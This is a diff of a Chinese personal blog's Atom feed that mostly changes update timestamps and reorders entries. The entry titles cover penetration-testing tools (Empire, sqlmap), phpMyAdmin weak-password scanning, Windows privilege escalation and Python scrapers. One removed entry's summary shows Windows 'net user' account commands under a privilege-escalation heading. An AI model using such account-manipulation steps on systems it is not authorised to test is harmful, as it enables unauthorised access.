     <link href="http://yoursite.com/2019/05/12/nei-wang-shen-tou-huan-jing-da-jian-xia/"/>
     <id>http://yoursite.com/2019/05/12/nei-wang-shen-tou-huan-jing-da-jian-xia/</id>
     <published>2019-05-12T00:23:58.000Z</published>
-    <updated>2019-05-14T07:17:28.476Z</updated>
+    <updated>2019-05-14T07:17:30.000Z</updated>
     
     <summary type="html">
     
@@ -69,7 +373,7 @@
     <link href="http://yoursite.com/2019/05/12/nei-wang-yu-huan-jing-da-jian-shang/"/>
     <id>http://yoursite.com/2019/05/12/nei-wang-yu-huan-jing-da-jian-shang/</id>
     <published>2019-05-11T23:45:28.000Z</published>
-    <updated>2019-05-12T12:19:58.957Z</updated>
+    <updated>2019-05-12T12:20:00.000Z</updated>
     
     <summary type="html">
     
@@ -93,7 +397,7 @@
     <link href="http://yoursite.com/2019/04/13/python-pa-chong-ji-ben-ku-de-shi-yong/"/>
     <id>http://yoursite.com/2019/04/13/python-pa-chong-ji-ben-ku-de-shi-yong/</id>
     <published>2019-04-12T16:12:25.000Z</published>
-    <updated>2019-04-13T13:50:56.011Z</updated>
+    <updated>2019-04-13T13:50:58.000Z</updated>
     
     <summary type="html">
     
@@ -113,11 +417,59 @@
   </entry>
   
   <entry>
+    <title>Empire-powershell渗透攻击框架工具</title>
+    <link href="http://yoursite.com/2019/04/12/empire-powershell-shen-tou-gong-ji-kuang-jia-gong-ju/"/>
+    <id>http://yoursite.com/2019/04/12/empire-powershell-shen-tou-gong-ji-kuang-jia-gong-ju/</id>
+    <published>2019-04-11T16:12:25.000Z</published>
+    <updated>2019-04-13T13:51:42.000Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h2 id=&quot;1-工具简介&quot;&gt;&lt;a href=&quot;#1-工具简介&quot; class=&quot;headerlink&quot; title=&quot;1. 工具简介&quot;&gt;&lt;/a&gt;1.
+        
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>bing批量采集URL去重复链接脚本</title>
+    <link href="http://yoursite.com/2019/04/12/bing-pi-liang-cai-ji-url-qu-chong-fu-lian-jie-jiao-ben/"/>
+    <id>http://yoursite.com/2019/04/12/bing-pi-liang-cai-ji-url-qu-chong-fu-lian-jie-jiao-ben/</id>
+    <published>2019-04-11T16:12:25.000Z</published>
+    <updated>2019-04-13T13:52:32.000Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;pre class=&quot; language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;#!/usr/bin/env
+        
+      
+    
+    </summary>
+    
+    
+      <category term="python黑客编程" scheme="http://yoursite.com/tags/python%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
     <title>matlab中mapminmax函数的总结</title>
     <link href="http://yoursite.com/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/"/>
     <id>http://yoursite.com/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/</id>
     <published>2019-04-11T16:12:25.000Z</published>
-    <updated>2019-04-11T16:12:53.519Z</updated>
+    <updated>2019-04-11T16:12:54.000Z</updated>
     
     <summary type="html">
     
@@ -141,7 +493,7 @@
     <link href="http://yoursite.com/2019/04/12/sqlmap-gong-ju-zong-jie/"/>
     <id>http://yoursite.com/2019/04/12/sqlmap-gong-ju-zong-jie/</id>
     <published>2019-04-11T16:12:25.000Z</published>
-    <updated>2019-04-13T13:53:01.726Z</updated>
+    <updated>2019-04-13T13:53:02.000Z</updated>
     
     <summary type="html">
     
@@ -161,35 +513,11 @@
   </entry>
   
   <entry>
-    <title>关于python爬虫的一些学习总结</title>
-    <link href="http://yoursite.com/2019/04/12/guan-yu-pa-chong-de-yi-xie-zong-jie-ji-ben-ku/"/>
-    <id>http://yoursite.com/2019/04/12/guan-yu-pa-chong-de-yi-xie-zong-jie-ji-ben-ku/</id>
-    <published>2019-04-11T16:12:25.000Z</published>
-    <updated>2019-04-13T13:53:49.481Z</updated>
-    
-    <summary type="html">
-    
-      
-      
-        
-        
-          &lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot;
-        
-      
-    
-    </summary>
-    
-    
-      <category term="python爬虫" scheme="http://yoursite.com/tags/python%E7%88%AC%E8%99%AB/"/>
-    
-  </entry>
-  
-  <entry>
     <title>使用python爬虫爬取猫眼电影</title>
     <link href="http://yoursite.com/2019/04/12/shi-yong-python-pa-qu-mao-yan-dian-ying/"/>
     <id>http://yoursite.com/2019/04/12/shi-yong-python-pa-qu-mao-yan-dian-ying/</id>
     <published>2019-04-11T16:12:25.000Z</published>
-    <updated>2019-04-13T13:53:26.499Z</updated>
+    <updated>2019-04-13T13:53:28.000Z</updated>
     
     <summary type="html">
     
@@ -209,35 +537,11 @@
   </entry>
   
   <entry>
-    <title>Empire-powershell渗透攻击框架工具</title>
-    <link href="http://yoursite.com/2019/04/12/empire-powershell-shen-tou-gong-ji-kuang-jia-gong-ju/"/>
-    <id>http://yoursite.com/2019/04/12/empire-powershell-shen-tou-gong-ji-kuang-jia-gong-ju/</id>
+    <title>关于python爬虫的一些学习总结</title>
+    <link href="http://yoursite.com/2019/04/12/guan-yu-pa-chong-de-yi-xie-zong-jie-ji-ben-ku/"/>
+    <id>http://yoursite.com/2019/04/12/guan-yu-pa-chong-de-yi-xie-zong-jie-ji-ben-ku/</id>
     <published>2019-04-11T16:12:25.000Z</published>
-    <updated>2019-04-13T13:51:41.645Z</updated>
-    
-    <summary type="html">
-    
-      
-      
-        
-        
-          &lt;h2 id=&quot;1-工具简介&quot;&gt;&lt;a href=&quot;#1-工具简介&quot; class=&quot;headerlink&quot; title=&quot;1. 工具简介&quot;&gt;&lt;/a&gt;1.
-        
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>手写python爬虫下载电子书一键发送到kindle</title>
-    <link href="http://yoursite.com/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/"/>
-    <id>http://yoursite.com/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/</id>
-    <published>2019-04-11T16:12:25.000Z</published>
-    <updated>2019-04-13T13:54:52.330Z</updated>
+    <updated>2019-04-13T13:53:50.000Z</updated>
     
     <summary type="html">
     
@@ -257,11 +561,11 @@
   </entry>
   
   <entry>
-    <title>bing批量采集URL去重复链接脚本</title>
-    <link href="http://yoursite.com/2019/04/12/bing-pi-liang-cai-ji-url-qu-chong-fu-lian-jie-jiao-ben/"/>
-    <id>http://yoursite.com/2019/04/12/bing-pi-liang-cai-ji-url-qu-chong-fu-lian-jie-jiao-ben/</id>
+    <title>手写python爬虫下载电子书一键发送到kindle</title>
+    <link href="http://yoursite.com/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/"/>
+    <id>http://yoursite.com/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/</id>
     <published>2019-04-11T16:12:25.000Z</published>
-    <updated>2019-04-13T13:52:31.460Z</updated>
+    <updated>2019-04-13T13:54:54.000Z</updated>
     
     <summary type="html">
     
@@ -269,14 +573,14 @@
       
         
         
-          &lt;pre class=&quot; language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;#!/usr/bin/env
+          &lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot;
         
       
     
     </summary>
     
     
-      <category term="python黑客编程" scheme="http://yoursite.com/tags/python%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
+      <category term="python爬虫" scheme="http://yoursite.com/tags/python%E7%88%AC%E8%99%AB/"/>
     
   </entry>
   
@@ -285,7 +589,7 @@
     <link href="http://yoursite.com/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/"/>
     <id>http://yoursite.com/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/</id>
     <published>2019-04-11T16:11:19.000Z</published>
-    <updated>2019-04-12T05:30:59.047Z</updated>
+    <updated>2019-04-12T05:31:00.000Z</updated>
     
     <summary type="html">
     
@@ -309,7 +613,7 @@
     <link href="http://yoursite.com/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/"/>
     <id>http://yoursite.com/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/</id>
     <published>2019-04-11T16:11:19.000Z</published>
-    <updated>2019-04-11T16:11:53.362Z</updated>
+    <updated>2019-04-11T16:11:54.000Z</updated>
     
     <summary type="html">
     
@@ -333,7 +637,7 @@
     <link href="http://yoursite.com/2019/04/12/python-zi-dong-deng-lu-xiao-yuan-wang/"/>
     <id>http://yoursite.com/2019/04/12/python-zi-dong-deng-lu-xiao-yuan-wang/</id>
     <published>2019-04-11T16:10:02.000Z</published>
-    <updated>2019-04-11T16:10:31.949Z</updated>
+    <updated>2019-04-11T16:10:32.000Z</updated>
     
     <summary type="html">
     
@@ -350,57 +654,6 @@
     
     
       <category term="python黑客编程" scheme="http://yoursite.com/tags/python%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>安全行业小工具以及学习资源收集</title>
-    <link href="http://yoursite.com/2019/04/12/web-an-quan-xue-xi-zi-liao-suo-yin/"/>
-    <id>http://yoursite.com/2019/04/12/web-an-quan-xue-xi-zi-liao-suo-yin/</id>
-    <published>2019-04-11T16:10:02.000Z</published>
-    <updated>2019-04-12T15:29:36.761Z</updated>
-    
-    <summary type="html">
-    
-      
-      
-        
-        
-          &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;安全行业小工具以及学习资源收集项目，此项目部分内容来自：&lt;a
-        
-      
-    
-    </summary>
-    
-    
-      <category term="学习工具" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E5%B7%A5%E5%85%B7/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>admin提权为system</title>
-    <link href="http://yoursite.com/2019/04/12/admin-ti-quan-wei-system/"/>
-    <id>http://yoursite.com/2019/04/12/admin-ti-quan-wei-system/</id>
-    <published>2019-04-11T16:08:38.000Z</published>
-    <updated>2019-04-11T16:09:24.715Z</updated>
-    
-    <summary type="html">
-    
-      
-      
-        
-        
-          &lt;p&gt;&lt;code&gt;windows&lt;/code&gt;底下设置密码&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;net user username *
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提醒输入密码，确认密码&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;net user&lt;/code&gt;查看当前系统下面的用户账号
-        
-      
-    
-    </summary>
-    
-    
-      <category term="web安全笔记" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
